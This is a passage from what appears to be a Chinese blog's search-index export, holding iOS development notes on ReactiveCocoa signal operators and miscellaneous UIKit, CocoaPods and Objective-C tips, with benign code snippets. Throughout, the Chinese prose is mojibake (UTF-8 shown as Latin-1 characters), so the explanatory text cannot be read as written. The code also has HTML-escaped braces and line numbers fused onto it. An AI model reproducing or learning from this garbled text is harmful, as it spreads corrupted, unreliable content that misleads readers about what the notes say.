·æœ‰å‰¯ä½œç”¨çš„äº†ï¼ŒæŽ¨èä½¿ç”¨åŠ¨è¯ç±»åž‹çš„æ–¹æ³•åï¼Œç”¨å¯¹åŠ¨è¯åŸºæœ¬å°±èƒ½çŸ¥é“æ˜¯ä¸æ˜¯æœ‰å‰¯ä½œç”¨äº†ï¼Œæ¯”å¦‚â€œ-loginSignalâ€å’Œâ€œ-saveToFileâ€å¤§æ¦‚å°±çŸ¥é“å‰é¢ä¸€ä¸ªå¾ˆå¯èƒ½æœ‰å‰¯ä½œç”¨ï¼ŒåŽé¢ä¸€ä¸ªå¤šå­˜å‡ æ¬¡æ–‡ä»¶åº”è¯¥æ²¡å‰¯ä½œç”¨ RAC VS åŽŸç”Ÿ rac_signalForSelectorï¼šç”¨äºŽæ›¿ä»£ä»£ç† rac_valuesAndChangesForKeyPathï¼šç”¨äºŽç›‘å¬æŸä¸ªå¯¹è±¡çš„å±žæ€§æ”¹å˜ rac_signalForControlEventsï¼šç”¨äºŽç›‘å¬æŸä¸ªäº‹ä»¶ã€‚ rac_addObserverForName:ç”¨äºŽç›‘å¬æŸä¸ªé€šçŸ¥ rac_textSignal:åªè¦æ–‡æœ¬æ¡†å‘å‡ºæ”¹å˜å°±ä¼šå‘å‡ºè¿™ä¸ªä¿¡å· å¤„ç†å½“ç•Œé¢æœ‰å¤šæ¬¡è¯·æ±‚æ—¶ï¼Œéœ€è¦éƒ½èŽ·å–åˆ°æ•°æ®æ—¶ï¼Œæ‰èƒ½å±•ç¤ºç•Œé¢ rac_liftSelector:withSignalsFromArray:Signals:å½“ä¼ å…¥çš„Signals(ä¿¡å·æ•°ç»„)ï¼Œæ¯ä¸€ä¸ªsignaléƒ½è‡³å°‘sendNextè¿‡ä¸€æ¬¡ï¼Œå°±ä¼šåŽ»è§¦å‘ç¬¬ä¸€ä¸ªselectorå‚æ•°çš„æ–¹æ³• ä½¿ç”¨æ³¨æ„ï¼šå‡ ä¸ªä¿¡å·ï¼Œå‚æ•°ä¸€çš„æ–¹æ³•å°±å‡ ä¸ªå‚æ•°ï¼Œæ¯ä¸ªå‚æ•°å¯¹åº”ä¿¡å·å‘å‡ºçš„æ•°æ® RACæä¾›çš„å® RAC() ä½ æä¾›æƒ³è¦ä¸Žå³å°†åˆ°æ¥çš„å€¼ç»‘å®šçš„å¯¹è±¡å’Œå‚æ•°, åœ¨å…¶å†…éƒ¨å®ƒæ‰€åšçš„æ˜¯åˆ›å»ºä¸€ä¸ªè®¢é˜…è€…å¹¶æ›´æ–°å…¶å±žæ€§çš„å€¼ è¿™ä¸ªå®æ˜¯æœ€å¸¸ç”¨çš„ï¼ŒRAC()æ€»æ˜¯å‡ºçŽ°åœ¨ç­‰å·å·¦è¾¹ï¼Œç­‰å·å³è¾¹æ˜¯ä¸€ä¸ªRACSignalï¼Œè¡¨ç¤ºçš„æ„ä¹‰æ˜¯å°†ä¸€ä¸ªå¯¹è±¡çš„ä¸€ä¸ªå±žæ€§å’Œä¸€ä¸ªsignalç»‘å®šï¼Œsignalæ¯äº§ç”Ÿä¸€ä¸ªvalueï¼ˆidç±»åž‹ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œï¼š[TARGET setValue:value ?: NIL_VALUE forKeyPath:KEYPATH]; 12345RACSignal *usernameIsValidSignal = RACObserve(self.viewModel, isUsernameValid);RAC(self.goButton, enabled) = usernameIsValidSignal; RAC(self.goButton, alpha) = [usernameIsValidSignal map:^id(NSNumber *usernameIsValid)&#123; return usernameIsValid.boolValue ? @1.0 : @0.5; &#125;]; RACObserve() è¿™ä¸ªå®æ˜¯RACä¸­å¯¹KVOä¸­é‚£äº›APIçš„æ›¿ä»£. ä½ åªéœ€è¦ä¼ å…¥å¯¹è±¡å’Œä½ æƒ³è§‚å¯Ÿçš„é‚£ä¸ªå¯¹è±¡æŸå±žæ€§çš„ keypath. ç»™å‡ºè¿™äº›å‚æ•°åŽ, RACObserveä¼šåˆ›å»ºä¸€ä¸ªä¿¡å·, ä¸€æ—¦å®ƒæœ‰äº†è®¢é˜…è€…, å®ƒå°±ç«‹åˆ»å‘é€é‚£ä¸ªå±žæ€§çš„å½“å‰å€¼, å¹¶åœ¨å‘é€é‚£ä¸ªå±žæ€§åœ¨è¿™ä¹‹åŽçš„ä»»ä½•å˜åŒ–. 123456// create and get a reference to the signal RACSignal *usernameValidSignal = RACObserve(self.viewModel, isUsernameValid);// update the local property when this value changes[usernameValidSignal subscribeNext: ^(NSNumber *isValidNumber) &#123;self.usernameIsValid = isValidNumber. boolValue&#125;]; å¾ªçŽ¯å¼•ç”¨çš„å® @weakify(self); // åœ¨å¤–é¢å£°æ˜Ž @strongify(self); // åœ¨å¼•ç”¨çš„åœ°æ–¹å£°æ˜Ž è¿™ä¸¤ä¸ªå®ä¸€å®šæˆå¯¹å‡ºçŽ°ï¼Œå…ˆweakå†strong å¸¸ç”¨çŸ¥è¯†ç‚¹ map : å°†ä¸€ä¸ªå€¼è½¬åŒ–ä¸ºå¦ä¸€ä¸ªå€¼è¾“å‡º å°†ä¼šåˆ›å»ºä¸€ä¸ªå’ŒåŽŸæ¥ä¸€æ¨¡ä¸€æ ·çš„ä¿¡å·ï¼Œåªä¸è¿‡æ–°çš„ä¿¡å·ä¼ é€’çš„å€¼å˜ä¸ºäº†blockï¼ˆvalueï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æžœblock(value)æ˜¯ä¸€ä¸ªä¿¡å·ï¼Œé‚£ä¹ˆå°±æ˜¯ä¿¡å·çš„valueä»ç„¶æ˜¯ä¿¡å·ã€‚ flattenMap : è§£å†³Signal of Signalsé—®é¢˜ï¼ŒflattenMapåˆ™ä¼šç»§ç»­è°ƒç”¨è¿™ä¸ªä¿¡å·çš„valueï¼Œä½œä¸ºæ–°çš„ä¿¡å·çš„valueã€‚ switchToLatest : ç”¨äºŽsignal of signalsï¼ŒèŽ·å–signal of signalså‘å‡ºçš„æœ€æ–°ä¿¡å·,ä¹Ÿå°±æ˜¯å¯ä»¥ç›´æŽ¥æ‹¿åˆ°RACCommandä¸­çš„ä¿¡å· filter : è¿‡æ»¤ä¸€äº›æ¡ä»¶ï¼Œä»¥ç¡®ä¿ç¬¦åˆæ¡ä»¶çš„å€¼æ‰èƒ½è¢«ä¼ é€’å‡ºåŽ» ignore : å¿½ç•¥ç»™å®šçš„å€¼ æ³¨æ„ï¼Œè¿™é‡Œå¿½ç•¥çš„æ—¢å¯ä»¥æ˜¯åœ°å€ç›¸åŒçš„å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æ˜¯- isEqual:ç»“æžœç›¸åŒçš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´è‡ªå·±å†™çš„Modelå¯¹è±¡å¯ä»¥é€šè¿‡é‡å†™- isEqual:æ–¹æ³•æ¥ä½¿- ignore:ç”Ÿæ•ˆã€‚å¸¸ç”¨çš„å€¼çš„åˆ¤æ–­æ²¡æœ‰é—®é¢˜ï¼Œå¦‚ä¸‹: 1234[[self.inputTextField.rac_textSignal ignore:@"seven"] subscribeNext:^(NSString *value)&#123;NSLog(@"`seven` could never appear : %@", value);&#125;]; distinctUntilChanged : å®ƒå°†è¿™ä¸€æ¬¡çš„å€¼ä¸Žä¸Šä¸€æ¬¡åšæ¯”è¾ƒï¼Œå½“ç›¸åŒæ—¶ï¼ˆä¹ŸåŒ…æ‹¬- isEqual:ï¼‰è¢«å¿½ç•¥æŽ‰ã€‚ 1234RAC(self.label, text) = [RACObserve(self.user, username) distinctUntilChanged];self.user.username = @"sunnyxx"; // 1stself.user.username = @"sunnyxx"; // 2ndself.user.username = @"sunnyxx"; // 3rd å¦‚æžœä¸å¢žåŠ distinctUntilChangedçš„è¯å¯¹äºŽè¿žç»­çš„ç›¸åŒçš„è¾“å…¥å€¼å°±ä¼šæœ‰ä¸å¿…è¦çš„å¤„ç†ï¼Œè¿™ä¸ªæ —å­åªæ˜¯ç®€å•çš„UIåˆ·æ–°ï¼Œä½†é‡åˆ°å¦‚å†™æ•°æ®åº“ï¼Œå‘ç½‘ç»œè¯·æ±‚çš„æƒ…å†µæ—¶ï¼Œä»£ä»·å°±ä¸èƒ½è´­å¿½ç•¥äº†ã€‚ æ‰€ä»¥ï¼Œå¯¹äºŽç›¸åŒå€¼å¯ä»¥å¿½ç•¥çš„æƒ…å†µï¼Œæžœæ–­åŠ ä¸Šå®ƒå§ã€‚ èµ·æ­¢ç‚¹è¿‡æ»¤ç±»åž‹ é™¤äº†è¢«åŠ¨çš„å½“nextå€¼æ¥çš„æ—¶å€™åšåˆ¤æ–­ï¼Œä¹Ÿå¯ä»¥ä¸»åŠ¨çš„æå‰é€‰æ‹©å¼€å§‹å’Œç»“æŸæ¡ä»¶ï¼Œåˆ†ä¸ºä¸¤ç§ç±»åž‹ï¼š takeåž‹ï¼ˆå–ï¼‰ skipåž‹(è·³) take:(NSUInteger) : ä»Žå¼€å§‹ä¸€å…±å–Næ¬¡çš„nextå€¼ï¼Œä¸åŒ…æ‹¬Competionå’ŒErrorï¼Œå¦‚ï¼š 123456789[[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123;[subscriber sendNext:@"1"];[subscriber sendNext:@"2"];[subscriber sendNext:@"3"];[subscriber sendCompleted];return nil;&#125;] take:2] subscribeNext:^(id x) &#123;NSLog(@"only 1 and 2 will be print: %@", x);&#125;]; takeLast:(NSUInteger) : å–æœ€åŽNæ¬¡çš„nextå€¼ æ³¨æ„ï¼Œç”±äºŽä¸€å¼€å§‹ä¸èƒ½çŸ¥é“è¿™ä¸ªSignalå°†æœ‰å¤šå°‘ä¸ªnextå€¼ï¼Œæ‰€ä»¥RACå®žçŽ°å®ƒçš„æ–¹æ³•æ˜¯å°†æ‰€æœ‰nextå€¼éƒ½å­˜èµ·æ¥ï¼Œç„¶åŽåŽŸSignalå®Œæˆæ—¶å†å°†åŽNä¸ªä¾æ¬¡å‘é€ç»™æŽ¥æ”¶è€… ä½†Errorå‘ç”Ÿæ—¶ä¾ç„¶æ˜¯ç«‹åˆ»å‘é€çš„ takeUntil:(RACSignal *) : å½“ç»™å®šçš„signalå®Œæˆå‰ä¸€ç›´å–å€¼, ä¹Ÿå°±æ˜¯è¿™ä¸ªSignalä¸€ç›´åˆ°textFieldæ‰§è¡Œdeallocæ—¶æ‰åœæ­¢ã€‚æœ€ç®€å•çš„æ —å­å°±æ˜¯UITextFieldçš„rac_textSignalçš„å®žçŽ°ï¼ˆåˆ å‡ç‰ˆæœ¬ï¼‰: 123456789- (RACSignal *)rac_textSignal &#123;@weakify(self);return [[[[[RACSignal concat:[self rac_signalForControlEvents:UIControlEventEditingChanged]] map:^(UITextField *x) &#123; return x.text; &#125;] takeUntil:self.rac_willDeallocSignal] // bingo!&#125; takeUntilBlock:(BOOL(^)(id x)) : å¯¹äºŽæ¯ä¸ªnextå€¼ï¼Œè¿è¡Œblockï¼Œå½“blockè¿”å›žYESæ—¶åœæ­¢å–å€¼ï¼Œå¦‚ï¼š 12345[[self.inputTextField.rac_textSignal takeUntilBlock:^BOOL(NSString *value) &#123;return [value isEqualToString:@"stop"];&#125;] subscribeNext:^(NSString *value) &#123;NSLog(@"current value is not `stop`: %@", value);&#125;]; takeWhileBlock:(BOOL(^)(id x)) : ä¸Šé¢çš„åå‘é€»è¾‘ï¼Œå¯¹äºŽæ¯ä¸ªnextå€¼ï¼Œblockè¿”å›ž YESæ—¶æ‰å–å€¼ skip:(NSUInteger) : ä»Žå¼€å§‹è·³è¿‡Næ¬¡çš„nextå€¼ï¼Œç®€å•çš„æ —å­ï¼š 123456789[[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123;[subscriber sendNext:@"1"];[subscriber sendNext:@"2"];[subscriber sendNext:@"3"];[subscriber sendCompleted];return nil;&#125;] skip:1] subscribeNext:^(id x) &#123;NSLog(@"only 2 and 3 will be print: %@", x);&#125;]; skipUntilBlock:(BOOL(^)(id x)) : å’Œ- takeUntilBlock:åŒç†ï¼Œä¸€ç›´è·³ï¼Œç›´åˆ°blockä¸ºYES skipWhileBlock:\(BOOL(^)(id x)) : å’Œ- takeWhileBlock:åŒç†ï¼Œä¸€ç›´è·³ï¼Œç›´åˆ°blockä¸ºNO merge : åˆå¹¶ä¿¡å·ï¼Œåªè¦æœ‰ä¸€ä¸ªä¿¡å·å˜åŒ–å°±ä¼šè°ƒç”¨ 12345678@weakify(self); [[RACSignal merge: @[RACObserve(self.viewModel, tweets),RACObserve(self.viewModel, allTweetsLoaded)]]bufferWithTime: 0 onScheduler: [RACScheduler mainThreadScheduler]]subscribeNext: ^(id value) &#123;@strongify(self);[self.tableView reloadData];&#125;]; combineLatest : å°†å¤šä¸ªä¿¡å·åˆå¹¶èµ·æ¥ï¼Œå¹¶ä¸”æ‹¿åˆ°å„ä¸ªä¿¡å·çš„æœ€æ–°çš„å€¼,å¿…é¡»æ¯ä¸ªåˆå¹¶çš„signalè‡³å°‘éƒ½æœ‰è¿‡ä¸€æ¬¡sendNextï¼Œæ‰ä¼šè§¦å‘åˆå¹¶çš„ä¿¡å· æ ¹æ®ç»„åˆçš„ä¿¡å·çš„å€¼å†è½¬æ¢ç”Ÿæˆåˆ¤æ–­æ¡ä»¶ 1234567RACSignal *signupActiveSignal = [RACSignal combineLatest:@[validUsernameSignal,validPwdSignal] reduce:^id(NSNumber *usernameValid, NSNumber *passwordValid) &#123;return @(usernameValid.boolValue &amp;&amp; passwordValid.boolValue);&#125;];[signupActiveSignal subscribeNext:^(NSNumber *state) &#123;self.signInButton.enabled = state.boolValue;&#125;]; doNext: æ³¨æ„doNext:å¹¶ä¸è¿”å›žä¸€ä¸ªå€¼ï¼Œå› ä¸ºå®ƒæ˜¯é™„åŠ æ“ä½œã€‚å®ƒå®Œæˆæ—¶ä¸æ”¹å˜äº‹ä»¶ã€‚ concat: æŒ‰ä¸€å®šé¡ºåºæ‹¼æŽ¥ä¿¡å·ï¼Œå½“å¤šä¸ªä¿¡å·å‘å‡ºçš„æ—¶å€™ï¼Œæœ‰é¡ºåºçš„æŽ¥æ”¶ä¿¡å· ï¼ˆåªéœ€è¦è®¢é˜…æ‹¼æŽ¥çš„ä¿¡å·å°±å¯ä»¥äº†ï¼‰ then: thenæ–¹æ³•ä¼šç­‰åˆ°completedäº‹ä»¶å‘å‡ºåŽè°ƒç”¨ï¼Œç„¶åŽè®¢é˜…ç”±then:blockå‚æ•°è¿”å›žçš„ä¿¡å·ã€‚è¿™æœ‰æ•ˆåœ°å°†æŽ§åˆ¶ä»Žä¸€ä¸ªä¿¡å·ä¼ é€’ç»™ä¸‹ä¸€ä¸ªä¿¡å· zipWith: æŠŠä¸¤ä¸ªä¿¡å·åŽ‹ç¼©æˆä¸€ä¸ªä¿¡å·ï¼Œåªæœ‰å½“ä¸¤ä¸ªä¿¡å·åŒæ—¶å‘å‡ºä¿¡å·å†…å®¹æ—¶ï¼Œå¹¶ä¸”æŠŠä¸¤ä¸ªä¿¡å·çš„å†…å®¹åˆå¹¶æˆä¸€ä¸ªå…ƒç»„ï¼Œæ‰ä¼šè§¦å‘åŽ‹ç¼©æµçš„nextäº‹ä»¶ RACScheduler : æ˜¯RACé‡Œé¢å¯¹çº¿ç¨‹çš„ç®€å•å°è£…ï¼Œäº‹ä»¶å¯ä»¥åœ¨æŒ‡å®šçš„schedulerä¸Šåˆ†å‘å’Œæ‰§è¡Œï¼Œ ä¸ç‰¹æ®ŠæŒ‡å®šçš„è¯ï¼Œäº‹ä»¶çš„åˆ†å‘å’Œæ‰§è¡Œéƒ½åœ¨ä¸€ä¸ªé»˜è®¤çš„åŽå°çº¿ç¨‹é‡Œé¢åšï¼Œå¤§å¤šæ•°æƒ…å†µä¹Ÿå°±ä¸ç”¨åŠ¨äº† æœ‰ä¸€äº›ç‰¹æ®Šçš„signalå¿…é¡»åœ¨ä¸»çº¿ç¨‹è°ƒç”¨ï¼Œä½¿ç”¨-deliverOnï¼šå¯ä»¥åˆ‡æ¢è°ƒç”¨çš„çº¿ç¨‹ã€‚ deliverOn: æ›´æ–°UIçš„æ—¶å€™å›žåˆ°ä¸»çº¿ç¨‹æ‰§è¡Œï¼ˆå­çº¿ç¨‹åŠ è½½å›¾ç‰‡ã€ä¸»çº¿ç¨‹åˆ·æ–°UIï¼‰ 1deliverOn:[RACScheduler mainThreadScheduler] chain : multicast : é¿å…å‰¯ä½œç”¨ï¼Œè¿™ä¸¤ä¸ªè®¢é˜…è€…æŽ¥æ”¶åˆ°äº†åŒæ ·çš„ä¸€ä¸ªè¯·æ±‚çš„å†…å®¹ 1234567891011// Starts a single request, no matter how many subscriptions `connection.signal`// gets. This is equivalent to the -replay operator, or similar to// +startEagerlyWithScheduler:block:.RACMulticastConnection *connection = [networkRequest multicast:[RACReplaySubject subject]];[connection connect];[connection.signal subscribeNext:^(id response) &#123; NSLog(@"subscriber one: %@", response);&#125;];[connection.signal subscribeNext:^(id response) &#123; NSLog(@"subscriber two: %@", response);&#125;]; timeout : è¶…æ—¶ï¼Œå¯ä»¥è®©ä¸€ä¸ªä¿¡å·åœ¨ä¸€å®šçš„æ—¶é—´åŽï¼Œè‡ªåŠ¨æŠ¥é”™ interval : å®šæ—¶ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´å‘å‡ºä¿¡å· delay : å»¶è¿Ÿå‘é€next retryé‡è¯• : åªè¦å¤±è´¥ï¼Œå°±ä¼šé‡æ–°æ‰§è¡Œåˆ›å»ºä¿¡å·ä¸­çš„block,ç›´åˆ°æˆåŠŸ replayé‡æ”¾ : å½“ä¸€ä¸ªä¿¡å·è¢«å¤šæ¬¡è®¢é˜…,åå¤æ’­æ”¾å†…å®¹ throttleèŠ‚æµ : å½“æŸä¸ªä¿¡å·å‘é€æ¯”è¾ƒé¢‘ç¹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨èŠ‚æµï¼Œåœ¨æŸä¸€æ®µæ—¶é—´ä¸å‘é€ä¿¡å·å†…å®¹ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´èŽ·å–ä¿¡å·çš„æœ€æ–°å†…å®¹å‘å‡º å»¶æ—¶å¤„ç†ï¼Œåªæœ‰åœ¨ä¸¤æ¬¡nextäº‹ä»¶é—´éš”æŒ‡å®šçš„æ—¶é—´æ—¶æ‰ä¼šå‘é€ç¬¬äºŒä¸ªnextäº‹ä»¶]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¸­ç¢Žç‰‡çŸ¥è¯†æ•´ç†]]></title>
    <url>%2Farchives%2Ffd0d6f33.html</url>
    <content type="text"><![CDATA[é•œæ¹–ä¸‰ç™¾é‡Œï¼Œè¡èå‘è·èŠ±ã€‚äº”æœˆè¥¿æ–½é‡‡ï¼Œäººçœ‹éš˜è‹¥è€¶ã€‚å›žèˆŸä¸å¾…æœˆï¼Œå½’åŽ»è¶ŠçŽ‹å®¶ã€‚ â€”â€”æŽç™½ã€Šå­å¤œå››æ—¶æ­ŒÂ·å¤æ­Œã€‹ çç¢Žåˆ†ç±»ä¸Žæ‰©å±• åˆ†ç±»ï¼ˆCategoryï¼‰ åªèƒ½æ‰©å……æ–¹æ³•ã€ä¸èƒ½æ‰©å……æˆå‘˜å˜é‡ ä¸æ˜¯è¯´ä¸èƒ½å†™propertyå±žæ€§ï¼Œè€Œæ˜¯å†™äº†åªä¼šæœ‰å¯¹åº”çš„setterå’Œgetteræ–¹æ³•çš„å£°æ˜Žï¼Œè€Œæ²¡æœ‰è¿™è¿™ä¸¤ä¸ªæ–¹æ³•çš„å®žçŽ° ï¼ˆUIViewæ‰©å……çš„é‚£äº›åªæ˜¯é‡å†™äº†æ–¹æ³• å¹¶ä¸æ˜¯æ·»åŠ äº†æ–°çš„å±žæ€§å˜é‡ï¼‰ å¯ä»¥ç”¨runtimeæ·»åŠ å±žæ€§ åŒ¿ååˆ†ç±» ï¼ˆæ‹¬å·é‡Œæ²¡æœ‰åç§°ï¼‰ å¯ä»¥æ‰©å……æ–¹æ³•ã€ä¹Ÿå¯ä»¥æ‰©å……æˆå‘˜å˜é‡ ä¸€ç¯‡æ¯”è¾ƒè¯¦ç»†æ·±å…¥çš„å‚è€ƒèµ„æ–™ Automatic Preferred Max Layout Width è­¦å‘Šè§£å†³åŠžæ³• CocoaPodså¯¼å…¥æ ¼å¼ ç¬¬ä¸€ç§å†™æ³•ï¼ˆæ²¡æ›´æ–°åˆ°cocoapodsæœ€è¿‘ç‰ˆæœ¬å¯ç”¨ï¼‰ 12platform : ios, '7.0'pod 'AFNetworking' ç¬¬äºŒç§å†™æ³• ï¼ˆæ›´æ–°åˆ°æœ€æ–°çš„ç‰ˆæœ¬ç¬¬ä¸€ç§å†™æ³•æŠ¥é”™ï¼‰ 1234platform :ios, '7.0'target "iOSé¡¹ç›®å" dopod 'FMDB'end å¦‚ä½•é€€å‡ºVIMç¼–è¾‘å™¨ i æ˜¯è¿›å…¥ç¼–è¾‘ è¿›å…¥ç¼–è¾‘çŠ¶æ€åŽæŒ‰ ï¼šesc å†æŒ‰ shiftï¼‹zzï¼Œæ³¨æ„æ˜¯ä¸¤ä¸‹z nilã€Nilã€NULLçš„åŒºåˆ« nilï¼šæŒ‡å‘ocä¸­å¯¹è±¡çš„ç©ºæŒ‡é’ˆï¼Œé’ˆå¯¹å¯¹è±¡ã€‚ Nilï¼šæŒ‡å‘ocä¸­ç±»çš„ç©ºæŒ‡é’ˆï¼Œé’ˆå¯¹ç±»ã€‚ NULLï¼šæŒ‡å‘å…¶ä»–ç±»åž‹çš„ç©ºæŒ‡é’ˆï¼Œå¦‚ä¸€ä¸ªcç±»åž‹çš„å†…å­˜æŒ‡é’ˆï¼ŒåŸºæœ¬æ•°æ®ç±»åž‹ä¸ºç©ºï¼ŒåŸºæœ¬ç±»åž‹ã€‚ NSNullï¼šåœ¨é›†åˆå¯¹è±¡ä¸­ï¼Œè¡¨ç¤ºç©ºå€¼çš„å¯¹è±¡ã€‚ è‹¥objä¸ºnilï¼š ï¼»obj messageï¼½å°†è¿”å›žNO,è€Œä¸æ˜¯NSException è‹¥objä¸ºNSNull: ï¼»obj messageï¼½å°†æŠ›å‡ºå¼‚å¸¸NSException å¤„ç†æœåŠ¡å™¨è¿”å›žçš„nullç©ºæ•°æ® ç”¨AFNè¯·æ±‚ç½‘ç»œæ—¶å¯ä»¥ä½¿ç”¨self.removesKeysWithNullValues = YES; ä½¿ç”¨åˆ†ç±» NullSafe ç›´æŽ¥å°†NullSafe.mæ–‡ä»¶æ‹–åˆ°é¡¹ç›®ä¸­ï¼Œä¸éœ€è¦å¼•å…¥ä»»ä½•.hå¤´æ–‡ä»¶ã€‚å¯ä»¥åœ¨è¿è¡Œæ—¶è‡ªåŠ¨å°†JSONä¸­çš„nullå€¼æ›¿æ¢æˆnilã€‚ githubåœ°å€ ç»ˆæžè§£å†³åŠžæ³•ï¼šMJExtensionå®žçŽ°å­—å…¸è½¬æ¨¡åž‹ã€‚ Appè·³è½¬æ–¹æ³•1[[UIApplication sharedApplication] openURL:[NSURL URLWithString:[NSString stringWithFormat:@"itms-apps://itunes.apple.com/app/id%@", myAppID]]]; èŽ·å–Windowçš„åŒºåˆ«123AppDelegate* appDelegate = (AppDelegate*)[UIApplication sharedApplication].delegate;UIWindow* window = appDelegate.window;UIWindow* keyw = [UIApplication sharedApplication].keyWindow; åœ¨æ²¡æœ‰ä½¿ç”¨UIAlertViewæ—¶ï¼Œä¸¤è€…ä¸€æ ·ï¼Œå‡ä¸ºæˆ‘ä»¬åº”ç”¨çš„çš„Windowï¼Œå…¶delegateä¸ºæˆ‘ä»¬çš„rootViewControllerã€‚ åœ¨è°ƒç”¨äº†UIAlertView showä¹‹åŽï¼Œåˆ°UIAlertViewæ¶ˆå¤±ä¹‹å‰ï¼Œkeywçš„å€¼æ˜¯UIAlertControllerShimPresenterWindowï¼Œå…¶delegateæ˜¯UIAlertShimPresentingViewControllerã€‚ ç‰ˆæœ¬å·åŒºåˆ« CFBundleShortVersionString è¯¥æ ‡å¿—è¡¨ç¤ºå°±æ˜¯åº”ç”¨çš„ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬æ˜¯ç”±ä¸‰ä¸ªæ•´æ•°åˆ†éš”ç»„æˆçš„å­—ç¬¦ä¸²ã€‚ç¬¬ä¸€ä¸ªæ•´æ•°ä»£è¡¨é‡å¤§ä¿®æ”¹çš„ç‰ˆæœ¬ï¼Œå¦‚å®žçŽ°æ–°çš„åŠŸèƒ½æˆ–é‡å¤§å˜åŒ–çš„ä¿®è®¢ã€‚ç¬¬äºŒä¸ªæ•´æ•°è¡¨ç¤ºçš„ä¿®è®¢ï¼Œå®žçŽ°è¾ƒçªå‡ºçš„ç‰¹ç‚¹ã€‚ç¬¬ä¸‰ä¸ªæ•´æ•°ä»£è¡¨ç»´æŠ¤ç‰ˆæœ¬ã€‚ è¯¥é”®çš„å€¼ä¸åŒäºŽâ€œCFBundleVersionâ€æ ‡è¯† CFBundleShortVersionStringå¯¹åº”Xcodeé‡Œé¡¹ç›®çš„Version CFBundleVersion æ ‡è¯†åº”ç”¨çš„å†…éƒ¨ç‰ˆæœ¬å· è¿™ä¸ªç‰ˆæœ¬æ˜¯å†…éƒ¨è‡ªå·±å›¢é˜Ÿä½¿ç”¨çš„ä¸€ä¸ªç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸å¯¹å¤–å…¬å¼€ã€‚ CFBundleVersion å¯¹åº”Xcodeé‡Œé¡¹ç›®çš„Build ç‚¹å‡»UIButtonå¼¹å‡ºUIPickerView1234567891011121314151617181920212223// ç”¨æ¥å¼¹å‡ºæŽ§ä»¶ UITextField *pickerViewTextField = [[UITextField alloc] initWithFrame:CGRectZero]; [self.view addSubview:pickerViewTextField]; self.pickerViewTextField = pickerViewTextField; // è®¾ç½®é€‰æ‹©æŽ§ä»¶ UIPickerView *pickerView = [[UIPickerView alloc] init]; pickerView.delegate = self; pickerView.dataSource = self; pickerView.showsSelectionIndicator = YES; self.pickerView = pickerView; pickerViewTextField.inputView = pickerView;// å·¥å…·æ¡ UIToolbar *toolbar = [[UIToolbar alloc] init]; toolbar.height = 44; UIBarButtonItem *item0 = [[UIBarButtonItem alloc] initWithTitle:@"å–æ¶ˆ" style:UIBarButtonItemStylePlain target:self action:@selector(cancelBtnClick)]; UIBarButtonItem *item1 = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemFlexibleSpace target:nil action:nil]; UIBarButtonItem *item2 = [[UIBarButtonItem alloc] initWithTitle:@"å®Œæˆ" style:UIBarButtonItemStylePlain target:self action:@selector(conformBtnClick)]; toolbar.items = @[item0, item1, item2]; pickerViewTextField.inputAccessoryView = toolbar;// ä¸€å®šè¦å†™ ä¸ç„¶å¼¹ä¸å‡ºæ¥ [pickerViewTextField becomeFirstResponder]; UITableViewCellUITableViewCellèƒŒæ™¯é¢œè‰² UITableViewCell è®¾ç½®èƒŒæ™¯é¢œè‰²å¿…é¡»æ˜¯ContentView è‡ªå®šä¹‰XIBå¯èƒ½æ²¡æœ‰ContentViewï¼Œä¹Ÿéœ€è¦è‡ªå·±åˆ›å»º UITableViewCellé€‰ä¸­é¢œè‰² iOS6ä¹‹å‰å¯ä»¥è®¾ç½®é€‰ä¸­é¢œè‰²ä¸ºç°è‰²ã€è“è‰²ã€æ²¡æœ‰é¢œè‰²ï¼›iOS7å¼€å§‹åªæœ‰é»˜è®¤ç°è‰²å’Œæ²¡æœ‰é¢œè‰²ä¸¤ç§ï¼Œéœ€è¦çš„è¯å¯ä»¥è‡ªå®šä¹‰é€‰ä¸­èƒŒæ™¯è®¾ç½®æƒ³è¦çš„é¢œè‰² UITableViewCellSelectionStyleBlue The cell has a default background color when selected. In iOS 7, the selection color is no longer blue. Use UITableViewCellSelectionStyleDefault instead. 1234UIView *bgColorView = [[UIView alloc] init];bgColorView.backgroundColor = [UIColor blueColor];bgColorView.layer.masksToBounds = YES;cell.selectedBackgroundView = bgColorView; UINavigationControlleræ‰‹åŠ¿é—®é¢˜ UINavigationController æ·»åŠ æ‰‹åŠ¿ä¼šé»˜è®¤æ·»åŠ ç»™æ‰€æœ‰pushè¿›æ¥çš„æŽ§åˆ¶å™¨ å¯ä»¥é€šè¿‡pushè¿›æ¥çš„æŽ§åˆ¶å™¨çš„æ•°é‡æŽ§åˆ¶ï¼Œï¼ˆtopViewController å¯ä»¥æ‹¿åˆ°æ ˆé¡¶æŽ§åˆ¶å™¨ï¼Œåœ¨æ ¹æŽ§åˆ¶å™¨åœ°æ–¹è®¾ç½®çš„è¯å°±æ˜¯æ‹¿åˆ°æ ¹æŽ§åˆ¶å™¨ï¼‰ ä¸‹é¢çš„æ–¹æ³•ä¹Ÿå¯ä»¥è¿‡æ»¤ä¸åŒçš„æ‰‹åŠ¿ gestureRecognizer:å¯ä»¥åˆ¤æ–­å½“å‰è§¦å‘çš„æ‰‹åŠ¿æ˜¯å“ªä¸€ä¸ª 1234- (BOOL)gestureRecognizerShouldBegin:(UIGestureRecognizer *)gestureRecognizer &#123; XSLog(@"gestureRecognizer : %@", gestureRecognizer); return self.viewControllers.count &gt; 1;&#125; æƒ³éšè—å¯¼èˆªæŽ§åˆ¶å™¨çš„å¯¼èˆªæ  æ–¹æ³•1 